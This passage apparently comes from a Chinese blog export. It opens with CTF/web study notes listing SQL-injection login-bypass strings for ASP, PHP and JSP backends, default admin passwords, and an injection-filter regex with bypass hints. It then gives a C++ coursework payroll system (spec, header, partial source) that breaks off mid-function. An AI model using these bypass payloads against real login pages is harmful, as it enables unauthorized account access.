<h1 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h1><blockquote>
<p> ‘r 1&#x3D;1 #</p>
<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<p> 账号： admin<br> 密码：admin</p>
<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<p> 账号：admin<br> 密码：admin888</p>
<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<p> 账号：admin</p>
<p> 密码：域名名</p>
<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
<h2 id="asp-aspx万能密码"><a href="#asp-aspx万能密码" class="headerlink" title="asp aspx万能密码"></a>asp aspx万能密码</h2><p> 1：”or ‘a’&#x3D;”a<br> 2： ‘’)or(‘a’&#x3D;’a<br> 3：or 1&#x3D;1-<br> 4：’or 1&#x3D;1-<br> 5：a’or’ 1&#x3D;1-<br> 6：”or 1&#x3D;1-<br> 7：’or’a’&#x3D;’a<br> 8：”or”&#x3D;”a’&#x3D;’a<br> 9：’or”&#x3D;’<br> 10：’or’&#x3D;’or’<br> 11: 1 or ‘1’&#x3D;’1’&#x3D;1<br> 12: 1 or ‘1’&#x3D;’1’ or 1&#x3D;1<br> 13: ‘OR 1&#x3D;1%00<br> 14: “or 1&#x3D;1%00<br> 15: ‘xor## PHP万能密码</p>
<p> ‘or’&#x3D;’or’</p>
<p> ‘or 1&#x3D;1&#x2F;* 字符型 GPC是否开都可以使用</p>
<p> User: something<br> Pass: ‘OR ‘1’&#x3D;’1</p>
<p> jsp 万能密码</p>
<p> 1’or’1’&#x3D;’1</p>
<p> admin’ OR 1&#x3D;1&#x2F;*</p>
<p> 用户名：admin 系统存在这个用户的时候 才用得上<br> 密码：1’or’1’&#x3D;’1</p>
</blockquote>
<h1 id="万能账号"><a href="#万能账号" class="headerlink" title="万能账号"></a>万能账号</h1><blockquote>
<p>a’ or true #</p>
<p>账号：…admin’ or ‘a’&#x3D;’a 密码随便填</p>
</blockquote>
<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><blockquote>
<hr>
<p>&#x2F;or|-||&#x2F;|*|&lt;|&gt;|!|x|hex|(|)|+|select&#x2F;i</p>
<blockquote>
<ol>
<li><code>/</code>：这个符号表示正则表达式模式的开始和结束。</li>
<li><code>|</code>：这个符号代表“或”条件，意味着可以匹配两边的任何模式。</li>
<li>\-, \, /, \*, &lt;, &gt;, !, x, hex, (, ), +, select&#96;: 这些是正则表达式将尝试匹配的实际模式。这些模式中的一些代表特定字符，而其他一些代表某些条件。<ul>
<li><code>-</code>：匹配破折号字符。</li>
<li><code>\\</code>：匹配反斜杠字符。</li>
<li><code>\/</code>：匹配正斜杠字符。</li>
<li><code>\\*</code>：匹配星号字符。</li>
<li><code>\&lt;</code>：匹配单词的开头。</li>
<li><code>\&gt;</code>：匹配单词的结尾。</li>
<li><code>\!</code>：匹配感叹号字符。</li>
<li><code>x</code>：匹配字母 ‘x’。</li>
<li><code>hex</code>：匹配字符串 ‘hex’。</li>
<li><code>\(</code>：匹配左括号。</li>
<li><code>\)</code>：匹配右括号。</li>
<li><code>\+</code>：匹配加号。</li>
<li><code>select</code>：匹配字符串 ‘select’。</li>
</ul>
</li>
</ol>
</blockquote>
<p>可以使用管道符||绕过和使用取反符号~~绕过</p>
</blockquote>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>实战</tag>
      </tags>
  </entry>
  <entry>
    <title>C++小型公司工资管理系统</title>
    <url>/2024/01/17/%E5%B0%8F%E5%9E%8B%E5%85%AC%E5%8F%B8%E5%B7%A5%E8%B5%84%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fcpp/</url>
    <content><![CDATA[<h2 id="课题要求"><a href="#课题要求" class="headerlink" title="课题要求"></a>课题要求</h2><p><em><strong>“小型公司工资管理系统设计”</strong></em></p>
<p><strong>1</strong>、<strong>问题描述</strong></p>
<p><strong>某公司需要存储雇员的编号、姓名、性别、所在部门，级别，并进行工资的计算。其中，雇员分为经理、技术人员、销售人员和销售经理。四类人员的月薪计算方法如下：经理拿固定月薪；技术人员按小时领取月薪；销售人员按其当月销售额的提成领取工资；销售经理既拿固定月薪也领取销售提成。</strong></p>
<p><strong>设计一程序能够对公司人员进行管理，应用到继承、抽象类、虚函数、虚基类、多态和文件的输入&#x2F;输出等内容。</strong></p>
<p><strong>2</strong>、<strong>功能要求</strong></p>
<p><strong>（1）添加功能：程序能够任意添加上述四类人员的记录，可提供选择界面供用户选择所要添加的人员类别，要求员工的编号要唯一，如果添加了重复编号的记录时，则提示数据添加重复并取消添加。</strong></p>
<p><strong>（2）查询功能：可根据编号、姓名等信息对已添加的记录进行查询，如果未找到，给出相应的提示信息，如果找到，则显示相应的记录信息；</strong></p>
<p><strong>（3）显示功能：可显示当前系统中所有记录，每条记录占据一行。</strong></p>
<p><strong>（4）编辑功能：可根据查询结果对相应的记录进行修改，修改时注意编号的唯一性。</strong></p>
<p><strong>（5）删除功能：主要实现对已添加的人员记录进行删除。如果当前系统中没有相应的人员记录，则提示“记录为空！”并返回操作；否则，输入要删除的人员的编号或姓名，根据所输入的信息删除该人员记录，如果没有找到该人员信息，则提示相应的记录不存。</strong></p>
<p><strong>（6）统计功能：能根据多种参数进行人员的统计。例如，统计四类人员数量以及总数，</strong></p>
<p><strong>或者统计男、女员工的数量，或者统计平均工资、最高工资、最低工资等信息。</strong></p>
<p><strong>（7）保存功能：可将当前系统中各类人员记录存入文件中，存入方式任意。</strong></p>
<p><strong>（8）读取功能：可将保存在文件中的人员信息读入到当前系统中，供用户进行使用。</strong></p>
<p><strong>3</strong>、<strong>问题的解决方案</strong></p>
<p><strong>根据系统功能要求，可以将问题解决分为以下步骤：</strong></p>
<p><strong>（1）应用系统分析，建立该系统的功能模块框图以及界面的组织和设计；</strong></p>
<p><strong>（2）分析系统中的各个实体及它们之间的关系；</strong></p>
<p><strong>（3）根据问题描述，设计系统的类层次；</strong></p>
<p><strong>（4）完成类层次中各个类的描述；</strong></p>
<p><strong>（5）完成类中各个成员函数的定义；</strong></p>
<p><strong>（6）完成系统的应用模块；</strong></p>
<p><strong>（7）功能调试；</strong></p>
<p><strong>（8）完成系统总结报告。</strong></p>
<h2 id="main-cpp"><a href="#main-cpp" class="headerlink" title="main.cpp"></a>main.cpp</h2><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;employee.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">init_list</span>();</span><br><span class="line">	<span class="built_in">load</span>();</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">	<span class="built_in">menu</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="employee-h"><a href="#employee-h" class="headerlink" title="employee.h"></a>employee.h</h2><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Employee_base</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Employee_base</span>();</span><br><span class="line">	<span class="built_in">Employee_base</span>(<span class="type">int</span> i, string n, string g, string d, string l, <span class="type">double</span> s,string t) :<span class="built_in">id</span>(i), <span class="built_in">name</span>(n), <span class="built_in">gender</span>(g), <span class="built_in">department</span>(d), <span class="built_in">level</span>(l), <span class="built_in">Salary</span>(s),<span class="built_in">type</span>(t) &#123;&#125;;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">double</span> <span class="title">calculateSalary</span><span class="params">()</span> <span class="type">const</span> </span>= <span class="number">0</span>;</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">getId</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">string <span class="title">getname</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">string <span class="title">getgender</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">string <span class="title">getdepartment</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">string <span class="title">getlevel</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="type">double</span> <span class="title">getsalary</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function">string <span class="title">gettype</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">int</span> id;<span class="comment">//编号</span></span><br><span class="line">	string name;<span class="comment">//姓名</span></span><br><span class="line">	string gender;<span class="comment">//性别</span></span><br><span class="line">	string department;<span class="comment">//部门</span></span><br><span class="line">	string level;<span class="comment">//级别</span></span><br><span class="line">	<span class="type">double</span> Salary;</span><br><span class="line">	string type;<span class="comment">//类型</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Manager</span>:<span class="keyword">virtual</span> <span class="keyword">public</span> Employee_base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Manager</span>();</span><br><span class="line">	<span class="built_in">Manager</span>(<span class="type">int</span> i, string n, string g, string d, string l, <span class="type">double</span> s,<span class="type">double</span> m,string t) :<span class="built_in">Employee_base</span>(i,n,g,d,l,s,t),<span class="built_in">MonthSalary</span>(m)&#123;&#125;</span><br><span class="line">	<span class="function"><span class="type">double</span> <span class="title">calculateSalary</span><span class="params">()</span> <span class="type">const</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">addmanager</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">double</span> MonthSalary;<span class="comment">//月薪</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Salesperson</span> :<span class="keyword">virtual</span> <span class="keyword">public</span> Employee_base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Salesperson</span>();</span><br><span class="line">	<span class="built_in">Salesperson</span>(<span class="type">int</span> i, string n, string g, string d, string l, <span class="type">double</span> s,<span class="type">double</span> sa,<span class="type">double</span> c,string t) :<span class="built_in">Employee_base</span>(i, n, g, d, l, s,t) ,<span class="built_in">SalesAmount</span>(sa),<span class="built_in">commision</span>(c)&#123;&#125;</span><br><span class="line">	<span class="function"><span class="type">double</span> <span class="title">calculateSalary</span><span class="params">()</span><span class="type">const</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">addsalesperson</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">double</span> SalesAmount;<span class="comment">//销售额</span></span><br><span class="line">	<span class="type">double</span> commision;<span class="comment">//提成率</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SalesManager</span> :<span class="keyword">virtual</span> <span class="keyword">public</span> Employee_base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">SalesManager</span>();</span><br><span class="line">	<span class="built_in">SalesManager</span>(<span class="type">int</span> i, string n, string g, string d, string l, <span class="type">double</span> s,<span class="type">double</span> m,<span class="type">double</span> sa,<span class="type">double</span> c,string t) :<span class="built_in">Employee_base</span>(i, n, g, d, l, s,t),<span class="built_in">MonthSalary</span>(m),<span class="built_in">SalesAmount</span>(sa),<span class="built_in">commision</span>(c) &#123;&#125;</span><br><span class="line">	<span class="function"><span class="type">double</span> <span class="title">calculateSalary</span><span class="params">()</span><span class="type">const</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">addsalesmanager</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">double</span> MonthSalary;</span><br><span class="line">	<span class="type">double</span> SalesAmount;</span><br><span class="line">	<span class="type">double</span> commision;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Technician</span> :<span class="keyword">virtual</span> <span class="keyword">public</span> Employee_base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Technician</span>();</span><br><span class="line">	<span class="built_in">Technician</span>(<span class="type">int</span> i, string n, string g, string d, string l, <span class="type">double</span> s,<span class="type">double</span> t,<span class="type">double</span> h,string ty) :<span class="built_in">Employee_base</span>(i, n, g, d, l, s,ty),<span class="built_in">time</span>(t),<span class="built_in">hourlyWage</span>(h)&#123;&#125;</span><br><span class="line">	<span class="function"><span class="type">double</span> <span class="title">calculateSalary</span><span class="params">()</span><span class="type">const</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">addtechnician</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	<span class="type">double</span> time;<span class="comment">//工作时间</span></span><br><span class="line">	<span class="type">double</span> hourlyWage;<span class="comment">//时薪</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Employees</span>:<span class="keyword">virtual</span> <span class="keyword">public</span> Manager, <span class="keyword">virtual</span> <span class="keyword">public</span> Salesperson, <span class="keyword">virtual</span> <span class="keyword">public</span> SalesManager, <span class="keyword">virtual</span> <span class="keyword">public</span> Technician</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">add_employee</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="type">double</span> <span class="title">calculateSalary</span><span class="params">()</span><span class="type">const</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">showEmployees</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">modifyname</span><span class="params">()</span></span>;<span class="comment">//修改姓名</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">modifygender</span><span class="params">()</span></span>;<span class="comment">//修改性别</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">modifydepartment</span><span class="params">()</span></span>;<span class="comment">//修改部门</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">modifylevel</span><span class="params">()</span></span>;<span class="comment">//修改级别</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">modifysalary</span><span class="params">()</span></span>;<span class="comment">//修改工资</span></span><br><span class="line">	<span class="function"><span class="type">void</span>  <span class="title">saveid</span><span class="params">(<span class="type">int</span> Id)</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span>  <span class="title">savename</span><span class="params">(string Name)</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span>  <span class="title">savegender</span><span class="params">(string gender)</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span>  <span class="title">savedepartment</span><span class="params">(string department)</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span>  <span class="title">savelevel</span><span class="params">(string level)</span></span>;</span><br><span class="line">	<span class="function"><span class="type">void</span>  <span class="title">savesalary</span><span class="params">(<span class="type">double</span> salary)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">	Manager m;</span><br><span class="line">	Salesperson	s;</span><br><span class="line">	SalesManager sm;</span><br><span class="line">	Technician t;</span><br><span class="line">	Employees e;</span><br><span class="line">	Node* next;</span><br><span class="line">&#125;Node,*Linklist;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Ide</span><span class="params">(<span class="type">int</span> Id)</span></span>;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">listlength</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">clear_buffer</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init_list</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">menu</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add_employee</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">query_employee</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">display_all</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">modify_employee</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">delete_employee</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">static_employee</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">save</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">load</span><span class="params">()</span></span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="employee-cpp"><a href="#employee-cpp" class="headerlink" title="employee.cpp"></a>employee.cpp</h2><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;employee.h&quot;</span></span></span><br><span class="line">Linklist head = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*基类抽象函数*/</span></span><br><span class="line">Employee_base::<span class="built_in">Employee_base</span>()</span><br><span class="line">&#123;</span><br><span class="line">	id = <span class="literal">NULL</span>;</span><br><span class="line">	name = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	gender = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	department = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	level = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	Salary = <span class="literal">NULL</span>;</span><br><span class="line">	type = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Employee_base::getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> id;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">string <span class="title">Employee_base::getname</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">string <span class="title">Employee_base::getgender</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> gender;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">string <span class="title">Employee_base::getdepartment</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> department;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">string <span class="title">Employee_base::getlevel</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> level;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">Employee_base::getsalary</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">//Salary = calculateSalary();</span></span><br><span class="line">	<span class="keyword">return</span> Salary;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">string <span class="title">Employee_base::gettype</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> type;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*派生类构造函数*/</span></span><br><span class="line">Manager::<span class="built_in">Manager</span>()</span><br><span class="line">&#123;</span><br><span class="line">	id = <span class="literal">NULL</span>;</span><br><span class="line">	name = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	gender = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	department = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	level = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	Salary = <span class="literal">NULL</span>;</span><br><span class="line">	MonthSalary = <span class="literal">NULL</span>;</span><br><span class="line">	type = <span class="string">&quot;经理&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">Salesperson::<span class="built_in">Salesperson</span>()</span><br><span class="line">&#123;</span><br><span class="line">	id = <span class="literal">NULL</span>;</span><br><span class="line">	name = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	gender = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	department = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	level = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	Salary = <span class="literal">NULL</span>;</span><br><span class="line">	SalesAmount = <span class="literal">NULL</span>;</span><br><span class="line">	commision = <span class="literal">NULL</span>;</span><br><span class="line">	type = <span class="string">&quot;销售人员&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">SalesManager::<span class="built_in">SalesManager</span>()</span><br><span class="line">&#123;</span><br><span class="line">	id = <span class="literal">NULL</span>;</span><br><span class="line">	name = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	gender = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	department = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	level = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	Salary = <span class="literal">NULL</span>;</span><br><span class="line">	MonthSalary = <span class="literal">NULL</span>;</span><br><span class="line">	SalesAmount = <span class="literal">NULL</span>;</span><br><span class="line">	commision = <span class="literal">NULL</span>;</span><br><span class="line">	type = <span class="string">&quot;销售经理&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">Technician::<span class="built_in">Technician</span>()</span><br><span class="line">&#123;</span><br><span class="line">	id = <span class="literal">NULL</span>;</span><br><span class="line">	name = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	gender = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	department = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	level = <span class="string">&quot;NULL&quot;</span>;</span><br><span class="line">	Salary = <span class="literal">NULL</span>;</span><br><span class="line">	time = <span class="literal">NULL</span>;</span><br><span class="line">	hourlyWage = <span class="literal">NULL</span>;</span><br><span class="line">	type = <span class="string">&quot;技术人员&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*派生类成员添加函数*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Manager::addmanager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> Id;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入经理编号：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; Id;</span><br><span class="line">	id=<span class="built_in">Ide</span>(Id);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入经理姓名：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; name;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入经理性别【男|女】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; gender;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入经理部门【销售部、技术部、人事部】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; department;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入经理级别【初级、中级、高级】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; level;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入经理的月薪：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; MonthSalary;</span><br><span class="line">	Salary = MonthSalary;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Salesperson::addsalesperson</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> Id;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售人员编号：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; Id;</span><br><span class="line">	id = <span class="built_in">Ide</span>(Id);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售人员姓名：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; name;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售人员性别【男|女】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; gender;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售人员部门【销售部、技术部、人事部】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; department;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售人员级别【初级、中级、高级】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; level;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售人员销售额：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; SalesAmount;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售人员提成率：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; commision;</span><br><span class="line">	Salary = SalesAmount * commision;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SalesManager::addsalesmanager</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> Id;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理编号：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; Id;</span><br><span class="line">	id = <span class="built_in">Ide</span>(Id);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理姓名：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; name;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理性别【男|女】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; gender;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理部门【销售部、技术部、人事部】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; department;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理级别【初级、中级、高级】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; level;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理的月薪：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; MonthSalary;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理销售额：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; SalesAmount;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入销售经理提成率：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; commision;</span><br><span class="line">	Salary = (SalesAmount * commision)+ MonthSalary;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Technician::addtechnician</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> Id;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入技术人员编号：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; Id;</span><br><span class="line">	id = <span class="built_in">Ide</span>(Id);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入技术人员姓名：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; name;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入技术人员性别【男|女】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; gender;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入技术人员部门【销售部、技术部、人事部】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; department;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入技术人员级别【初级、中级、高级】：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; level;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入技术人员的时薪：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; hourlyWage;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入技术人员的工作时间：&quot;</span>;</span><br><span class="line">	cin &gt;&gt; time;</span><br><span class="line">	Salary = time * hourlyWage;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Employees::add_employee</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> Id;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请输入员工编号：&quot;</span>;</span><br><span 